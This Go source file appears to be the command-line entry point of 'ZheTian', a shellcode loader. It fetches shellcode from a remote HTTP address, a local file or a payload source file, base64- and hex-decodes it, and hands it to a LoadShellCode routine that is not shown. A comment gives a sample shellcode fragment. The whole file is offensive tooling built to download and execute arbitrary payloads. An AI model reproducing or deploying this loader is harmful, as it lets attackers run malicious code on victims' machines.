package server

import (
	"encoding/base64"
	"encoding/hex"
	"errors"
	"fmt"
	"github.com/spf13/cobra"
	"os"
)

var (
	Uri           string //远程资源路径
	FilePath      string //本地资源路径
	Resource      string //源文件
	ShellCodeByte []byte
	rootCmd       = &cobra.Command{
		Use:   "ZheTian",
		Short: "http://github.com/yqcs/ZheTian",
		RunE: func(cmd *cobra.Command, args []string) error {
			err := startService()
			if err != nil {
				fmt.Println(err)
				os.Exit(1)
			}
			return nil
		},
	}
)

//初始化
func init() {
	rootCmd.PersistentFlags().StringVarP(&Uri, "Uri", "u", "", "HTTP service address hosting shellCode byte file")
	rootCmd.PersistentFlags().StringVarP(&FilePath, "FilePath", "r", "", "read from local byte file")
	rootCmd.PersistentFlags().StringVarP(&Resource, "Payload Resource", "s", "", "read payload source file,Supported lang:java、C、python、ruby、c#、perl、ruby...")
}

//Execute 挂载cli，等待执行
func Execute() {
	if len(os.Args) <= 1 {
		fmt.Println("\nRun command: ZheTian -help")
		return
	}
	if err := rootCmd.Execute(); err != nil {
		panic(err.Error())
	}
}

//shellcode格式：
//java类型需去除0x
//c or python 类型需去除\x
//示例：fc4883e4f0e8c8000000415141
func startService() error {

	//只能输入一个。就算输入多个也不会全部执行
	if Uri != "" {
		UriModel()
	} else if FilePath != "" {
		ReadFileModel()
	} else if Resource != "" {
		ResourceModel()
	} else {
		fmt.Println("\nRun command: ZheTian -help")
		os.Exit(0)
	}
	decodeBytes, err := base64.StdEncoding.DecodeString(string(ShellCodeByte))
	if err != nil {
		return errors.New(err.Error())
	}
	shellCode, err := hex.DecodeString(string(decodeBytes))
	if err == nil {
		LoadShellCode(shellCode)
	}
	return errors.New(err.Error())
}
